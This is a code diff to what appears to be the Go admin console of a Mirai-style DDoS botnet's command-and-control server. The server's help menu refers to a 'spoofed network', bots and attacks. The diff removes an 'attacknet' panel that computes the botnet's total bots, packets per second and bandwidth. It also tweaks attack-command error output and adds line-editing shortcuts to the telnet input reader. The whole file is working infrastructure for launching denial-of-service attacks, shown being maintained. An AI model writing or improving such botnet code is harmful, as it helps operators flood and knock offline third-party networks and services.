@@ -191,7 +191,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
 			this.conn.Write([]byte("│        spoofed network - help menu                          │\r\n"))
 			this.conn.Write([]byte("├────── commands ──────────────────────────────────────────────┤\r\n"))
-			this.conn.Write([]byte("│ help, count, methods, bots, stats, attacknet, stop         │\r\n"))
+			this.conn.Write([]byte("│ help, count, methods, adminhelp                            │\r\n"))
 			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
 			continue
 		}
@@ -296,34 +296,6 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
 			continue
 		}
-
-		if cmd == "attacknet" {
-			this.conn.Write([]byte("\033[2J\033[1H"))
-			this.conn.Write([]byte("\x1b[1;31m┌──────────────────────────────────────────────────────────────┐\r\n"))
-			this.conn.Write([]byte("\x1b[1;31m│                    NETWORK ATTACK POWER                    │\r\n"))
-			this.conn.Write([]byte("\x1b[1;31m├──────────────────────────────────────────────────────────────┤\r\n"))
-			
-			botCount := clientList.Count()
-			
-			// расчет мощности сети
-			avgPps := 50000 // средний pps на бота
-			avgBandwidth := 100 // средний мбит/с на бота
-			
-			totalPps := botCount * avgPps
-			totalBandwidth := botCount * avgBandwidth
-			totalGbps := float64(totalBandwidth) / 1000.0
-			
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Bots:        \x1b[1;36m%-10d bots                    \x1b[1;31m│\r\n", botCount)))
-			this.conn.Write([]byte("\x1b[1;31m├──────────────────────────────────────────────────────────────┤\r\n"))
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mNetwork Power:     \x1b[1;32m%-10d PPS                     \x1b[1;31m│\r\n", totalPps)))
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Bandwidth:   \x1b[1;32m%-10d Mbps                    \x1b[1;31m│\r\n", totalBandwidth)))
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Bandwidth:   \x1b[1;32m%-10.2f Gbps                    \x1b[1;31m│\r\n", totalGbps)))
-			this.conn.Write([]byte("\x1b[1;31m├──────────────────────────────────────────────────────────────┤\r\n"))
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mActive Attacks:    \x1b[1;33m%-10d attacks                 \x1b[1;31m│\r\n", database.fetchRunningAttacks())))
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Attacks:     \x1b[1;33m%-10d attacks                 \x1b[1;31m│\r\n", database.fetchAttacks())))
-			this.conn.Write([]byte("\x1b[1;31m└──────────────────────────────────────────────────────────────┘\x1b[0m\r\n"))
-			continue
-		}
 		
 		if userInfo.admin == 1 && cmd == "adminhelp" {
 			this.conn.Write([]byte("\033[2J\033[1H"))
@@ -339,7 +311,6 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mbots          List connected bots     \x1b[38;5;208m│\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mstop          Stop all attacks        \x1b[38;5;208m│\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mstats         Network statistics       \x1b[38;5;208m│\r\n"))
-			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mattacknet     Attack power stats      \x1b[38;5;208m│\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;208m└──────────────────────────────────────────────┘\r\n"))
 			continue
 		}
@@ -565,7 +536,7 @@ func (this *Admin) Handle() {
 
 		atk, err := NewAttack(cmd, userInfo.admin)
 		if err != nil {
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s is not a valid command!\033[0m\r\n", cmd)))
+			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
 		} else {
 			buf, err := atk.Build()
 			if err != nil {
@@ -604,7 +575,28 @@ func (this *Admin) ReadLine(masked bool) (string, error) {
 				this.conn.Write([]byte("\b \b"))
 				bufPos--
 			}
-			bufPos--
+		} else if buf[bufPos] == '\x15' { // Ctrl+U - clear line
+			for i := 0; i < bufPos; i++ {
+				this.conn.Write([]byte("\b \b"))
+			}
+			bufPos = 0
+		} else if buf[bufPos] == '\x17' { // Ctrl+W - clear word
+			// находим начало слова
+			wordStart := bufPos
+			for wordStart > 0 && buf[wordStart-1] != ' ' {
+				wordStart--
+			}
+			// удаляем слово
+			for i := wordStart; i < bufPos; i++ {
+				this.conn.Write([]byte("\b \b"))
+			}
+			bufPos = wordStart
+		} else if buf[bufPos] == '\x1B' { // ESC - clear line
+			// очищаем всю строку
+			for i := 0; i < bufPos; i++ {
+				this.conn.Write([]byte("\b \b"))
+			}
+			bufPos = 0
 		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
 			bufPos--
 		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
@@ -614,13 +606,7 @@ func (this *Admin) ReadLine(masked bool) (string, error) {
 			this.conn.Write([]byte("^C\r\n"))
 			return "", nil
 		} else {
-			if buf[bufPos] == '\x1B' {
-				buf[bufPos] = '^'
-				this.conn.Write([]byte(string(buf[bufPos])))
-				bufPos++
-				buf[bufPos] = '['
-				this.conn.Write([]byte(string(buf[bufPos])))
-			} else if masked {
+			if masked {
 				this.conn.Write([]byte("*"))
 			} else {
 				this.conn.Write([]byte(string(buf[bufPos])))
